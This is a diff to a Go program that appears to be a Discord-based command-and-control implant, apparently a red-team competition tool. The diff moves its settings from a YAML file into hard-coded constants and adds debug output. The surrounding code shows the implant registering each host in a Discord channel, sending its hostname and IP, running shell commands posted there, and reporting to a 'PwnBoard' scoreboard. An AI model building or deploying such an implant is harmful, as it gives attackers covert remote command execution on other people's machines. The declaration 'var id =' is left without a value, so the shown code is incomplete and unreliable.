@@ -12,30 +12,25 @@ import (
 	"strings"
 	"time"
 	"encoding/json"
-	"gopkg.in/yaml.v3"
+	"github.com/emmaunel/DiscordGo/discord"
 	"github.com/andersfylling/disgord"
-	creator "./discord"
 )
+
+//------------------CONSTANTS---------------------
+var botToken = "CHANGE-ME"
+var id =  // <-------- Server ID
+var categoryName = "bsd"
+var channelName = "bsd-team"
+
+//------------------CONSTANTS---------------------
+
 
 var categoryid disgord.Snowflake
 var channelid disgord.Snowflake
+var generalid disgord.Snowflake
 var con = context.Background()
-var glocli *disgord.Client
 var channel *disgord.Channel = nil
 var debug = true
-
-//Config is used to represent the config file
-type Config struct {
-    Discord struct {
-        Token string `yaml:"bot_token"`
-        ID int `yaml:"server_id"`
-	} `yaml:"discord"`
-	
-    Channel struct {
-        OS string `yaml:"category_name"`
-        TeamNum string `yaml:"channel_name"`
-    } `yaml:"channel"`
-}
 
 // PwnBoard json post request 
 type PwnBoard struct {
@@ -49,6 +44,12 @@ func processError(err error){
 
 func userInput(s disgord.Session, evt *disgord.MessageCreate){
 	msg := evt.Message
+	fmt.Println(msg.Content)
+	fmt.Println(msg.ChannelID)
+
+	if generalid == msg.ChannelID {
+		fmt.Println("Am I general")
+	}
 
 	// If the channel ID is not the same as the message's Channel ID
 	// Ignore it
@@ -88,7 +89,6 @@ func shellRun(cmd string) string{
 	// special cd
 	splittedCommand := strings.Fields(string(cmd))
 	args := splittedCommand[1:]
-	// fmt.Println("args ", args)
 	if splittedCommand[0] == "cd" {
 		os.Chdir(strings.Join(args, ""))
 		return "Changed directory Successfully"
@@ -166,36 +166,11 @@ func prettyOutput(out string) string {
 }
 
 // Entry Point
-// Reads the config file
-// Make a connection to the discord server
-// Create the OS type as category
-// Create teams under the category
-// Gets systeminfo and pins it
-// Also updates pwnboard every 7 seconds because why not
 func main(){
-	// Config file
-	f, err := os.Open("config.yaml")
-	if err != nil {
-		processError(err)
-	}
-	defer f.Close()
-
-	var config Config
-	decoder := yaml.NewDecoder(f)
-	err = decoder.Decode(&config)
-	if err != nil {
-	    processError(err)
-	}
 
 	client := disgord.New(disgord.Config{
-		BotToken: config.Discord.Token,
+		BotToken: botToken,
 	})
-
-	glocli = client
-
-	id := config.Discord.ID
- 	categoryName := config.Channel.OS
- 	channelName := config.Channel.TeamNum
 
 	// Pwnboard updates
 	// Remove this if it doesn't apply to you
@@ -209,17 +184,19 @@ func main(){
 	channels, _ := client.GetGuildChannels(con, guild.ID)
 
 	//create catogory
-	category := creator.CreateCategory(client, id, channels, categoryName)
+	category := discord.CreateCategory(client, id, channels, categoryName)
 	categoryid = category.ID
 
 	//general channel
-	// creator.CreateChannel(client, id,  category, "general")<--------------------TODO
+	// gen := discord.CreateChannel(channels, client, id,  category, "general") //<--------------------TODO
+	// generalid = gen.ID
+	// fmt.Println("Gen ", generalid)
 
 	//create channel
-	channel = creator.CreateChannel(channels, client, id,  category, channelName)
+	channel = discord.CreateChannel(channels, client, id,  category, channelName)
 	channelid = channel.ID
 
-	// sending system ingo
+	// sending system info
 	hostname , _ := os.Hostname()
 	systeminfo := ""
 	systeminfo += "IP: " + getIP() + "\n"
